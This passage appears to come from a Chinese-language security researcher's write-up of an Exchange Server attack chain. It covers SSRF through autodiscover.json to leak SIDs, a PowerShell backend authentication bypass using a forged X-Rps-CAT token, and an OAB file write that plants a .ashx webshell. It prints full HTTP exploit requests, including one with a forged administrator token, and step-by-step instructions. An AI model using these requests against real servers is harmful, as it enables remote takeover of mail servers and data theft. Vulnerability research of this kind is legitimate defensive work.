    Set-Cookie: X-BackEndCookie=; expires=Sun, 31-Mar-1991 02:22:42 GMT; path=/Autodiscover; secure; HttpOnly
    X-Powered-By: ASP.NET
    X-FEServer: EXCHANGE16
    Date: Wed, 31 Mar 2021 02:22:42 GMT
    Content-Length: 1314
    http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetUserSettingsResponse15122424Exchange2015NoErrorNoErrorNo error.
        UserDN
        /o=domain corp/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=6b9c2aa9d1804deea9b54779f8d4d0ec-SystemMailbo
以下有效负载允许从`UserDN`获取用户的 `SID`。
    POST /Autodiscover/autodiscover.json?SecurityToken1=PI:EMAIL/mapi/emsmdb HTTP/1.1
    Host: exchange16.domaincorp.com
    Connection: keep-alive
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
    X-User-Identity: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com
    X-Requestid: {C715155F-2BE8-44E0-BD34-2960065754C8}:2
    X-Requesttype: Connect
    X-Clientinfo: {2F94A2BF-A2E6-4CCC-BF98-B5F22C542226}
    X-Clientapplication: Outlook/15.0.4815.1002
    Content-Type: application/mapi-http
    Cookie: email=Autodiscover/autodiscover.json?SecurityToken1=PI:EMAIL
    Content-Length: 149
    /o=domain corp/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=6b9c2aa9d1804deea9b54779f8d4d0ec-SystemMailbo....
`SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com`的SID是
`S-1-5-21-3452439987-3899459676-4048896270-1124`。
我们得到域ID：`3452439987-3899459676-4048896270` 和管理员帐户的
SID：`S-1-5-21-3452439987-3899459676-4048896270-500`。
## 漏洞二
通过在 url 中伪造 `X-CommonAccessToken，Powershell`后端服务中的身份验证绕过漏洞。
利用第一个`SSRF`漏洞，远程攻击者可以向具有`LocalSystem`权限的`Powershell`后端服务发送请求。但是`Powershell`后端服务会额外检查`X-CommonAccessToken`标头是否存在
,`X-CommonAccessToken`标头从前端传递到后端以标识当前登录用户。
但是`Powershell`后端服务有一个`IIS` 模块，允许在检查之前将 `X-Rps-CAT`
查询字符串转换为`X-CommonAccessToken` 标头。 因此，远程攻击者可以使用`X-Rps-CAT` 查询字符串伪造任意
`X-CommonAccessToken` 标头。
演示如下：
    POST /Autodiscover/autodiscover.json?SecurityToken1=PI:EMAIL/powershell?serializationLevel=Full;ExchClientVer=15.1.2044.4;clientApplication=ManagementShell;TargetServer=;PSVersion=5.1.14393.3053&X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBhET01BSU5BQkNEXGFkbWluaXN0cmF0b3JVLVMtMS01LTIxLTM0NTI0Mzk5ODctMzg5OTQ1OTY3Ni00MDQ4ODk2MjcwLTUwMEcKAAAABwAAAC1TLTEtNS0yMS0zNDUyNDM5OTg3LTM4OTk0NTk2NzYtNDA0ODg5NjI3MC01MTMHAAAAB1MtMS0xLTAHAAAAB1MtMS01LTIHAAAACFMtMS01LTExBwAAAAhTLTEtNS0xNQcAAAAtUy0xLTUtMjEtMzQ1MjQzOTk4Ny0zODk5NDU5Njc2LTQwNDg4OTYyNzAtNTIwBwAAAC1TLTEtNS0yMS0zNDUyNDM5OTg3LTM4OTk0NTk2NzYtNDA0ODg5NjI3MC01MTIHAAAALVMtMS01LTIxLTM0NTI0Mzk5ODctMzg5OTQ1OTY3Ni00MDQ4ODk2MjcwLTUxOAcAAAAtUy0xLTUtMjEtMzQ1MjQzOTk4Ny0zODk5NDU5Njc2LTQwNDg4OTYyNzAtNTE5BwAAAAhTLTEtMTgtMUUAAAAA HTTP/1.1
    Host: exchange16.domaincorp.com
    Connection: keep-alive
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
    Content-Type: application/soap+xml;charset=UTF-8
    Cookie: email=Autodiscover/autodiscover.json?SecurityToken1=PI:EMAIL
    Content-Length: 7075
    ....
我反转了`CommonAccessToken` 的格式，并为管理员帐户构造了一个强大的令牌，其中包含一些域组，如域管理员、模式管理员……（domainid
之前就被泄露了，domain_name 可以是任何字符串）。
至此我们有了`CommonAccessToken`，可以发送具有管理员权限的`powershell` 请求。 我重写了一个简单的`Powershell
Remoting`协议，允许我运行`Exchange`的任何`cmdlet`。
但是目前只能运行`Exchange的cmdlet`，不能运行Windows的任何cmdlet，也不能运行像 `Add-Content -Path
C:\test.txt -Text abc`这样的简单 cmdlet。
当然，我们可以运行这样的`cmdlet：get-mailbox,...`。
## 漏洞三
`OAB` 后端服务中的任意文件写入允许远程攻击者可以在`OAB`文件夹上编写 `webshell`。
在讲述这个漏洞的细节之前，我先介绍以下`OAB`的概念。
脱机通讯簿 (OAB) 是地址列表集合的本地副本。
在具有管理员帐户的`Exchange Management Shell`中，我们可以创建一个新的 OAB：
    New-OffLineAddressbook -Name test1 -AddressLists "Default Global Address List"
然后获取新的脱机通讯簿的 GUID。
在此示例中，guid 为`02f1b6a8-8b8f-40c8-9df3-ac753563f9b8`。
我们可以通过直接访问 url 请求 OAB
文件：
第一次生成OAB文件，保存在文件夹`C:\Program Files\Microsoft\Exchange
Server\V15\ClientAccess\OAB\02f1b6a8-8b8f-40c8-9df3-ac753563f9b8`。
OAB文件除了保存在OS文件系统中外，还保存在特殊系统邮箱`SystemMailbox`（前面提到的）的OAB文件夹中`{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com`。
我们可以通过在
`SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com`邮箱上调用`EWS`服务来检查这一点。
在邮箱的OAB文件夹中，有一个主题为`02f1b6a8-8b8f-40c8-9df3-ac753563f9b8`的项目`IPM.FileSet`（与以前相同的guid）。
因此，对于我们使用`cmdlet New-OfflineAddressBook`创建的每个 OAB：
  * `C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\OAB\`中会有对应的文件夹;
  * 在`SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com`邮箱的OAB文件夹中会有一个对应的项目`IPM.FileSet`，主题为``。
生成新的OAB文件的过程是：
  1. 从 url`/oab//oab.xml`获取 `oab_guid`;
  2. 检查 `SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com`邮箱的文件夹 OAB 中是否存在主题为``的项目;
  3. 如果该项目存在，下载邮箱中该项目的所有附件，保存在`C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\OAB\`中；
  4. 如果不存在，生成OAB文件，保存在`SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com`邮箱的OAB文件夹中。
注意第三步，演示如下：
所以如果我们可以控制`SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com`邮箱的文件夹OAB，我们就可以控制`C:\Program
Files\Microsoft\Exchange Server\V15\ClientAccess\OAB\中`的文件``。
该漏洞出现在第 3 步，当 OAB 文件被下载并保存在 OS 文件系统中时，不会检查文件名是否为恶意扩展名，如 `.aspx`、`.ashx`。
所以如果我们可以控制`SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com`邮箱的文件夹OAB，我们就可以在`C:\Program
Files\Microsoft\Exchange Server\V15\ClientAccess\OAB\`中，写一个`webshell
`并通过 url `/oab//malicious.ashx`访问 webshell。
我结合以前的两个漏洞控制了`SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com`邮箱的文件夹OAB。
使用第二个`Powershell` 身份验证绕过漏洞，我可以发出一个`powershell cmdlet New-OfflineAddressBook`来创建新的 OAB，并获取 `oab_guid`。
然后，在`SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com`邮箱的权限下使用`SSRF`向`/ews/exchange.asmx`发送请求（`SSRF`请求使用`LocalSystem`帐户进行身份验证，因此具有模拟权限
另一个具有 `SerializedSecurityContext`元素的邮箱用户）。
使用两个漏洞，我执行了以下步骤：
  * 在 `SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com`的 OAB 文件夹中创建主题为`` 的新项目`IPM.FileSet`;
  * 在这一项附上两个文件`oab.xml`和r`skvp93.ashx`（这一步很复杂，因为我必须使用导入、导出技术来控制两个文件的hash属性）;
  * 通过访问 url `/oab//oab.xml` 触发`OABGeneratorProcess`;
  * `OABGeneratorProcess`将在 `SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com`的 OAB 文件夹中下载主题为``的项目中的所有附件;
  * `OABGeneratorProcess`将在`C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\OAB\`的操作系统文件系统中保存所有附件;
  * 在`/oab//rskvp93.ashx`获得 webshell。
## 有用的邮箱
PI:EMAIL (from VcsLab of Viettel Cyber Security)